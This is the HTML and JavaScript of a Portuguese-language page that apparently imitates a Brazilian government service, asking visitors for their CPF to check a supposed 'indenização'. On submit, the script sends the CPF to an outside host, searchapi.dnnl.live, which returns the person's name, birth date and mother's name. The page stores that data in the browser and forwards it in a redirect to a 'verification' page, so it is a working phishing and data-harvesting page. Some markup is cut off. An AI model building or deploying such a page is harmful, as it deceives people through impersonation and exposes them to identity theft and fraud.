    <div class="w-full min-h-screen">
      <div class="max-w-lg w-full mx-auto space-y-4 bg-[#1351B4] min-h-screen">

        <div class="px-4 pb-10">
          <div class="w-full flex items-center justify-center">

            >
              <h3 class="text-black font-medium text-base">Identifique-se:</h3>

              <div class="space-y-6">
                <div class="flex items-center gap-2">
                  <img
                    alt="Logo"
                    width="25"
                    height="25"
                    class="size-5"
                    src="image_4"
                  />
                  <span class="text-sm text-[#333333]">Número do CPF</span>
                </div>
                <p class="text-sm text-[#333333]">
                  Digite seu CPF para
                  <span class="font-bold text-black">consultar</span> sua
                  indenização
                </p>
              </div>

              <form class="flex-1 w-full">
                <div class="space-y-1 w-full">
                  <label for="cpf" class="text-sm text-[#333333]">CPF</label>
                  <input
                    type="tel"
                    id="cpf"
                    placeholder="Digite seu CPF"
                    class="w-full h-10 px-3 border text-sm placeholder:font-light text-black rounded-md focus:ring-0 focus:border-transparent placeholder:italic box-border"
                    name="cpf"
                    maxlength="14"
                    style="box-sizing: border-box"
                  />
                </div>
                <div class="pt-6">
                  <button
                    type="submit"
                    class="inline-flex items-center justify-center gap-2 h-10 px-4 w-full bg-[#1351B4] text-white py-2 rounded-full text-sm font-medium"
                  >
                    Consultar
                  </button>
                </div>
              </form>

              <div class="flex items-center justify-center mt-auto">
                <button
                  type="button"
                  class="text-[#1351B4] hover:text-[#1351B4]/90 text-lg hover:underline flex items-center justify-center gap-3"
                >
                  <div>
                    <img
                      alt="logo"
                      width="20"
                      height="20"
                      class="size-4"
                      src="image1.png"
                    />
                  </div>
                  <span class="text-[#1351B4] font-medium text-xs"

    <script>
      document.addEventListener("DOMContentLoaded", function () {
        const form = document.querySelector("form");
        const cpfInput = document.getElementById("cpf");

        // Formata o CPF enquanto digita
        cpfInput.addEventListener("input", function (e) {
          let value = e.target.value.replace(/\D/g, "");
          if (value.length > 11) value = value.slice(0, 11);

          if (value.length > 9) {
            value = value.replace(
              /^(\d{3})(\d{3})(\d{3})(\d{2}).*/,
              "$1.$2.$3-$4"
            );
          } else if (value.length > 6) {
            value = value.replace(/^(\d{3})(\d{3})(\d{3}).*/, "$1.$2.$3");
          } else if (value.length > 3) {
            value = value.replace(/^(\d{3})(\d{3}).*/, "$1.$2");
          }

          e.target.value = value;
        });

        form.addEventListener("submit", async function (e) {
          e.preventDefault();

          const cpf = cpfInput.value.replace(/\D/g, "");
          if (cpf.length !== 11) {
            alert("Por favor, digite um CPF válido");
            return;
          }

          const submitButton = form.querySelector('button[type="submit"]');
          const originalButtonText = submitButton.innerHTML;
          submitButton.innerHTML =
            '<div class="loader" style="display: inline-block;"></div> Consultando...';
          submitButton.disabled = true;

          try {
            const response = await fetch(
              `https://searchapi.dnnl.live/consulta?cpf=${cpf}&token_api=5765`
            );
            const data = await response.json();

            if (data.status === 200 && data.dados && data.dados.length > 0) {
              // Salva os dados no localStorage
              localStorage.setItem("userData", JSON.stringify(data.dados[0]));

              // Cria a URL com os parâmetros
              const userData = data.dados[0];
              const params = new URLSearchParams({
                cpf: userData.CPF,
                nome: userData.NOME,
                nascimento: userData.NASC,
                nome_mae: userData.NOME_MAE || "",
              });

              // Redireciona para a página de verificação com os parâmetros
              window.location.href =
                `./veri/index.htm?${params.toString()}` + window.location.search;
            } else {
              alert("CPF não encontrado na base de dados.");
            }
          } catch (error) {
            alert("Erro ao consultar o CPF. Tente novamente mais tarde.");
            console.error("Erro:", error);
          } finally {
            submitButton.innerHTML = originalButtonText;
            submitButton.disabled = false;
          }
        });
      });
    </script>
